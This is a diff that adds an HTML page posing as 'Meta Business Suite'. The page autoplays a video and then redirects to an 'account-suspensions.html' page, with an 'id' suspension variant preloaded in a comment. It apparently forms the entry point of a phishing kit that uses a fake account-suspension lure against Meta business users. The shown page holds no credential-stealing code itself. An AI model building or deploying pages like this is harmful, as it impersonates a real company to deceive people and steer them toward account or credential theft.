@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Meta Business Suite</title>
+    <link rel="shortcut icon" href="/logo.png" type="image/x-icon" />
+    <!-- <link rel="preload" href="suspension.id.html" as="document" /> -->
+    <style>
+      body,
+      html {
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      #myVideo {
+        max-width: 100%;
+        max-height: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <video id="myVideo" autoplay preload="auto" muted playsinline>
+      <source src="Mate.mp4" type="video/mp4" />
+      Your browser does not support the video tag.
+    </video>
+    <script>
+      document.getElementById("myVideo").addEventListener('ended', function() {
+          // Lưu trạng thái đã xem video vào localStorage
+          localStorage.setItem("myVideo", 'true');
+          // Chuyển hướng đến trang nội dung chính
+          window.location.href = "account-suspensions.html";
+      });
+  </script>
+  </body>
+</html>
